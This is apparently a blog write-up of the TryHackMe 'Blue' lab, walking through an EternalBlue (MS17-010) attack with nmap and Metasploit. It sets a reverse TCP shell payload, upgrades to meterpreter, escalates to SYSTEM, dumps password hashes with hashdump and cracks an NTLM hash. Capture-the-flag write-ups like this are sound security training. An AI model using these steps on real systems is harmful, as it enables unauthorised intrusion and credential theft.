---
layout: blog
title: THM Blue Writeup
publishDate: 2023-12-02T23:15:00.000Z
description: test
tags:
  - tryhackme
  - writeup
---
EternalBlue is a computer exploit developed by the U.S. National Security Agency (NSA). It was leaked by the Shadow Brokers hacker group on April 14, 2017, one month after Microsoft released patches for the vulnerability.
[EternalBlue - Wikipedia](https://en.wikipedia.org/wiki/EternalBlue)

## Task 1

Scan all open ports for vulnerabilities using Nmap.

```sh
nmap -sV -vv --script vuln TARGET_IP -oN nmap/blue
```

## Task 2

Run Metasploit. Search for MS17-010 exploits and select the appropriate one. Set RHOSTS to the target's IP address.

```
set payload windows/x64/shell/reverse_tcp
```

Run the exploit to get shell access. 

## Task 3
To upgrade the shell to meterpreter, first background the shell (Ctrl+Z). Check the session ID using `sessions` command. 
Note the session ID and run:
```
sessions -u <session-id>
```
This command should use the post module `post/multi/manage/shell_to_meterpreter` to upgrade the selected session.

Verify that we have escalated to `NT AUTHORITY\SYSTEM`. Run `getsystem` to confirm this.

![[Pasted image 20231202152543.png]]


Migrate to this process using the `migrate PROCESS_ID` command, where process ID can be any process running on `NT AUTHORITY\SYSTEM`. List all processes by running `ps`.

![[Pasted image 20231202153037.png]]

## Task 4
Within our elevated meterpreter shell, run the command `hashdump`. This will dump all of the passwords on the machine as long as we have the correct privileges to do so.

![[Pasted image 20231202153220.png]]

To crack the password of user 'Jon', extract the NTLM hash and use [CrackStation](https://crackstation.net/) 
